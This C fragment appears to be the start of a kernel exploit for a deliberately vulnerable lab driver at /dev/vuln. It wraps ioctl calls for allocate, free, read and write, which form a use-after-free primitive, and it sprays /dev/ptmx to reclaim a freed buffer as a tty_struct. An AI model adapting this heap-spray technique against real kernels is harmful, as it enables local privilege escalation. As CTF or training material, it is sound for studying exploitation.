#include "libpwn.h"

#define DEV_PATH "/dev/vuln"
#define K1_TYPE 0xB9

#define ALLOC _IOW(K1_TYPE, 0, size_t)
#define FREE _IO(K1_TYPE, 1)
#define USE_READ _IOR(K1_TYPE, 2, char)
#define USE_WRITE _IOW(K1_TYPE, 2, char)


int open_ptmx[PTMX_SPRAY] = { 0 };          // Store fds for clean up/ioctl()
int num_ptmx = 0;                           // Number of open fds

int open_device() {
    int fd = open(DEV_PATH, O_RDWR);
    if (fd < 0) error("open");
    return fd;
}


void kalloc(size_t size) {
    if (ioctl(fd, ALLOC, &size) < 0) error("kalloc");
    log_info("Allocated memory of size");
}

void kfree() {
    if (ioctl(fd, FREE) < 0) error("kfree");
    log_info("Freed memory");
}

void use_write(void *data) {
    if (ioctl(fd, USE_WRITE, data) < 0) error("use_write");
    log_info("Wrote data to buffer");
}

void use_read(void *buffer) {
    if (ioctl(fd, USE_READ, buffer) < 0) error("use_read");
    log_info("Read data from buffer");
}

bool is_tty(){
    memset(&tty, 0, sizeof(tty));
	use_read(&tty);
	char *str = ((char*)&tty) + 0x160;
	return str[0] == 'p' && str[1] == 't' && str[2] == 'm';
}

void alloc_tty() {
    int fd_tty = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (fd_tty < 0) error("Failed to open /dev/ptmx");
    open_ptmx[num_ptmx] = fd_tty;
    num_ptmx++;
}
